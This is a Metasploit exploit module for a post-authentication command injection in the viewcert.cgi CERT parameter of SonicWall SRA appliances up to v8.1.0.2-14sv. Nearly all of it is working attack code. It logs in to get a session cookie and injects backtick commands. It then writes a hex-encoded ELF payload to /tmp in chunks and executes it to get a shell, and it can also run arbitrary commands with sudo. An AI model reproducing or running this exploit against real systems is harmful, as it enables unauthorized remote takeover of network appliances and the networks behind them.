# Exploit Title: Sonicwall viewcert.cgi CGI Remote Command Injection Vulnerablity
# Date: 12/24/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#
# CVE : (awaiting cve)

# vuln: viewcert.cgi / CERT parameter

# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug.
#
# xort @ Critical Start




require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sonicwall SRA <= v8.1.0.2-14sv viewcert.cgi remote exploit',
					'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
				a section of the machine's adminstrative infertface for performing configurations
				related to on-connect scripts to be launched for users's connecting.
			},
			'Author'         =>
				[
					'xort@Critical Start', # vuln + metasploit module
				],
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                {
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Linux Universal',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux'
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
					OptString.new('CMD', [ false, 'Command to execute', "" ]),
					Opt::RPORT(443),
				], self.class)
	end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;

                # send request
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/cgi-bin/userLogin",
		      'headers' => {
			   'Connection' => 'close',
			   'Content-Type' => 'application/x-www-form-urlencoded',
			   'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
	              },
                      'vars_post' => {
			   'username' => username,
			   'password' => password_clear,
			   'domain' => 'LocalDomain',
			   'loginButton' => 'Login',
			   'state' => 'login',
			   'login' => 'true',
			   'VerifyCert' => '0',
			   'portalname' => 'VirtualOffice',
			   'ajax' => 'true'
		       },
                }, timeout)

		swap = res.headers['Set-Cookie'].split('\n').grep(/(.*)swap=([^;]+);/){$2}[0]

                return swap
        end


	def run_command(swap_cookie, cmd)

                # vars
                timeout = 1550;

                res = send_request_cgi({
                   'method' => 'POST',
                   'uri'    => "/cgi-bin/viewcert",
                   'data' => "buttontype=delete&CERT=newcert-1`#{cmd}`",
                   'headers' =>
                        {
                                'Cookie' => "swap=#{swap_cookie}",
                        },
                }, timeout)
	end

	def run_command_spliced(swap_cookie, cmd)

              write_mode = ">"
              dump_file = "/tmp/qq"
	      reqs = 0

              cmd_encoded = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

              for cmd_chunk in cmd_encoded.split(/(....................................)/)

                        cmd_new = "printf \"#{cmd_chunk}\"#{write_mode}#{dump_file}"
			reqs += 1

			vprint_status("Running Command (#{reqs})\n")

                        # set to normal append for loops after the first round
                        if write_mode == ">"
                                write_mode = ">>"
                        end

                        # add cmd to array to be exected later
                        run_command(swap_cookie, cmd_new)
               end
#		vprint_status("Running Final Command ...\n")

                # execute payload stored at dump_file
                run_command(swap_cookie, "chmod +x /tmp/qq; sh /tmp/qq")

	end

	def exploit
		# timeout
		timeout = 1550;

		# params
		password_clear = datastore['PASSWORD']
		user = datastore['USERNAME']

		# do authentication
		swap_cookie = do_login(user, password_clear)

		vprint_status("authenticated 'swap' cookie: #{swap_cookie}\n")

		 #if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(swap_cookie, ("sudo /bin/rm -f /tmp/n; printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))

                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')


                        run_command_spliced(swap_cookie, "printf \"#{encoded_elf}\">/tmp/m;chmod +rx /tmp/m;/tmp/m")
			# wait for magic
                        handler
                end
	end
end